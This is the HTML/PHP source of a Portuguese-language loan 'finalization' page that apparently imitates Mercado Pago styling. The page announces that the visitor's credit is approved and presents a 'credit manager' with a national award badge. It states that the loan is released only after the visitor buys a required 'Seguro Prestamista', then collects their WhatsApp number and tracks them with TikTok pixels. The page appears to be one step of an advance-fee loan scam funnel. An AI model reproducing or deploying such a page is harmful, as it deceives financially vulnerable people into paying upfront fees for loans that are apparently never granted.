<!DOCTYPE html>
<html lang="pt-BR">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finalização</title>


<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4BQAE3C77UD6NKP6AK0');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->



    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'mp-blue': '#009EE3',
                        'mp-dark-blue': '#0074A8',
                        'mp-light-blue': '#E6F7FF',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        main {
            flex: 1;
        }

        .fade-in {
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }

        .animate-pulse-custom {
            animation: pulse 2s infinite;
        }

        .form-input:focus {
            border-color: #009EE3;
            box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.1);
        }
    </style>
</head>
<body class="bg-gray-50">
    <?php include 'header.php'; ?>

    <main class="py-8 px-4 md:py-12">
        <div class="max-w-2xl mx-auto">
            <div class="bg-gradient-to-r from-green-500 to-green-600 text-white text-center py-4 px-6 rounded-t-2xl shadow-lg">
                <div class="flex items-center justify-center gap-2 mb-1">
                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                    </svg>
                    <span class="font-semibold">Crédito Aprovado</span>
                </div>
                <h1 class="text-xl font-bold">Liberação em Andamento</h1>
            </div>

            <div class="bg-white rounded-b-2xl shadow-lg border border-gray-100 p-6 md:p-8 fade-in">
                <div class="text-center mb-8">
                    <img src="manager.jpg" alt="Gerente de Crédito"
                         class="w-24 h-24 rounded-full object-cover mx-auto mb-4 border-4 border-mp-blue shadow-md animate-pulse-custom">

                    <h2 class="text-xl font-bold text-gray-900 mb-1">Karen Oliveira</h2>
                    <p class="text-gray-600 mb-2">Gerente de Crédito Pessoal</p>
                    <div class="inline-block bg-gradient-to-r from-amber-400 to-amber-500 text-white px-4 py-1.5 rounded-full text-xs font-semibold shadow-sm">
                        Destaque Nacional 2024
                    </div>
                </div>

                <div class="bg-mp-light-blue border-l-4 border-mp-blue rounded-lg p-5 mb-6">
                    <p class="text-gray-700 leading-relaxed">
                        Karen é a responsável por acompanhar com segurança a liberação do seu empréstimo. Seu crédito foi <strong>aprovado</strong> e está em fase final de liberação.
                    </p>
                </div>

                <div class="bg-gray-50 rounded-xl p-5 mb-6 border border-gray-200">
                    <h3 class="font-semibold text-gray-900 mb-3">Próximos passos:</h3>
                    <p class="text-gray-700 text-sm leading-relaxed">
                        Para finalizar e liberar seu empréstimo, é necessário concluir a contratação do <strong>Seguro Prestamista</strong>, exigido para validação bancária e ativação do seguro obrigatório da operação.
                    </p>
                </div>

                <div class="mb-8">
                    <label for="telefone" class="block text-sm font-medium text-gray-700 mb-2 text-center">
                        Informe seu WhatsApp para continuar
                    </label>
                    <input
                        type="text"
                        id="telefone"
                        maxlength="15"
                        placeholder="(00) 00000-0000"
                        class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg text-center focus:outline-none transition-all text-lg"
                    >
                    <div id="telefone-error" class="text-red-600 text-sm mt-2 text-center hidden">Digite um WhatsApp válido</div>
                </div>

                <button
                    id="submitBtn"
                    class="w-full bg-mp-blue text-white py-4 rounded-lg text-lg font-semibold hover:bg-mp-dark-blue hover:shadow-lg transition-all"
                >
                    <span class="btn-text">Concluir liberação</span>
                </button>

                <div class="mt-6 pt-6 border-t border-gray-100">
                    <div class="flex items-start gap-3 text-sm text-gray-600">
                        <svg class="w-5 h-5 text-mp-blue flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
                        </svg>
                        <span>Seus dados estão protegidos e serão usados apenas para finalização do processo</span>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <?php include 'footer.php'; ?>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const telefoneInput = document.getElementById('telefone');
            const submitBtn = document.getElementById('submitBtn');

            telefoneInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 11) value = value.slice(0, 11);
                e.target.value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
                validateField(this);
            });

            submitBtn.addEventListener('click', function(e) {
                e.preventDefault();

                const telefoneValid = validateField(telefoneInput);

                if (!telefoneValid) {
                    telefoneInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    telefoneInput.focus();
                    return;
                }

                try {
                    localStorage.setItem('telefone', telefoneInput.value);
                } catch(err) {
                    console.warn('localStorage error:', err);
                }

                this.innerHTML = '<svg class="animate-spin h-5 w-5 mx-auto" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>';
                this.disabled = true;

                const urlParams = new URLSearchParams(window.location.search);
                setTimeout(() => {
                    window.location.href = `9.php?${urlParams.toString()}`;
                }, 1000);
            });
        });

        function validateField(field) {
            const value = field.value.trim();
            const errorElement = document.getElementById(field.id + '-error');
            const cleanPhone = value.replace(/\D/g, '');
            const isValid = cleanPhone.length >= 10;

            errorElement.textContent = isValid ? '' : 'Digite um WhatsApp válido (mínimo 10 dígitos)';
            field.classList.remove('border-green-500', 'bg-green-50', 'border-red-500');

            if (value) {
                if (isValid) {
                    field.classList.add('border-green-500', 'bg-green-50');
                    errorElement.classList.add('hidden');
                } else {
                    field.classList.add('border-red-500');
                    errorElement.classList.remove('hidden');
                }
            } else {
                errorElement.classList.add('hidden');
            }

            return isValid;
        }
    </script>
</body>
</html>
